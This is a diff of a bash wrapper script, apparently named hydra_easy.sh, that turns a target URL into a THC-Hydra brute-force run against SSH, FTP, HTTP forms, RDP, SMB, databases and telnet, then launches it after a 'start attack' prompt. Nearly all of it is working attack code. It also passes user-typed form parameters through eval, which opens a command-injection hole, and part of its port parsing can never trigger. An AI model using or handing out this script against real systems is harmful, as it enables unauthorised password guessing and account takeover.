@@ -2,24 +2,115 @@
 
 # Basic usage function
 function show_help {
-    echo "Usage: ./hydra_easy.sh <username> <passwords_file> <target_ip> [service]"
-    echo "Example: ./hydra_easy.sh admin passwords.txt 192.168.1.1 ssh"
+    echo "Usage: ./hydra_easy.sh <target_url>"
+    echo "Example: ./hydra_easy.sh http://192.168.1.1"
+    echo "Example: ./hydra_easy.sh ssh://192.168.1.1"
+    echo ""
+    echo "Supported protocols: ssh, ftp, http, https, mysql, postgresql, rdp, smb, telnet"
     exit 1
 }
 
 # Check for required arguments
-if [ "$#" -lt 3 ]; then
+if [ "$#" -lt 1 ]; then
     show_help
 fi
 
-# Assign input parameters
-username=$1
-passwords_file=$2
-target_ip=$3
-service=${4:-ssh}  # Default to SSH if no service is specified
+# Get target URL
+target_url=$1
+
+# Extract protocol and IP from URL
+if [[ "$target_url" == *"://"* ]]; then
+    protocol=$(echo "$target_url" | cut -d':' -f1)
+    ip=$(echo "$target_url" | cut -d'/' -f3 | cut -d':' -f1)
+    
+    # Check if port is specified
+    if [[ "$target_url" == *":"* ]] && [[ "$target_url" != *"://"* ]]; then
+        port=$(echo "$target_url" | grep -oP '(?<=:)\d+' | head -1)
+    elif [[ "$target_url" == *":"* ]]; then
+        port=$(echo "$target_url" | cut -d':' -f3 | cut -d'/' -f1)
+    fi
+else
+    # Assume it's just an IP
+    ip=$target_url
+    protocol="ssh"  # Default to SSH if no protocol specified
+fi
+
+# Set default passwords file (you can modify this path)
+passwords_file="passwords.txt"
+
+# Check if passwords file exists
+if [ ! -f "$passwords_file" ]; then
+    echo "Error: Passwords file '$passwords_file' not found!"
+    echo "Please create a passwords.txt file in the current directory"
+    exit 1
+fi
+
+# Prompt for username if not provided
+echo "Enter username (default: admin):"
+read -r username
+username=${username:-admin}
+
+# Map protocols to Hydra service names
+case $protocol in
+    http|https)
+        service="http-post-form"
+        echo "For HTTP/HTTPS, you may need to specify the form parameters."
+        echo "Example: \"/login.php:username=^USER^&password=^PASS^:Invalid\""
+        echo "Enter form path and parameters (or press Enter to use basic auth):"
+        read -r form_params
+        if [ -n "$form_params" ]; then
+            service="$service \"$form_params\""
+        else
+            service="http-get"
+        fi
+        ;;
+    ssh)
+        service="ssh"
+        ;;
+    ftp)
+        service="ftp"
+        ;;
+    mysql)
+        service="mysql"
+        ;;
+    postgresql)
+        service="postgresql"
+        ;;
+    rdp)
+        service="rdp"
+        ;;
+    smb)
+        service="smb"
+        ;;
+    telnet)
+        service="telnet"
+        ;;
+    *)
+        service="ssh"  # Default to SSH
+        echo "Unknown protocol, defaulting to SSH"
+        ;;
+esac
+
+# Build the hydra command
+if [ -n "$port" ]; then
+    hydra_cmd="hydra -l \"$username\" -P \"$passwords_file\" -s $port $ip $service"
+else
+    hydra_cmd="hydra -l \"$username\" -P \"$passwords_file\" $ip $service"
+fi
+
+# Display what we're about to do
+echo "========================================="
+echo "Target: $ip"
+echo "Username: $username"
+echo "Password file: $passwords_file"
+echo "Service: $service"
+echo "Command: $hydra_cmd"
+echo "========================================="
+echo "Press Enter to start attack or Ctrl+C to cancel..."
+read -r
 
 # Run THC-Hydra with provided arguments
-hydra -l "$username" -P "$passwords_file" "$target_ip" "$service"
+eval "$hydra_cmd"
 
-# Notify the user about the attack initiation
-echo "Attack initiated on $target_ip with username '$username' using service '$service'."
+# Notify the user about the attack completion
+echo "Attack completed on $ip with username '$username' using service '$service'."
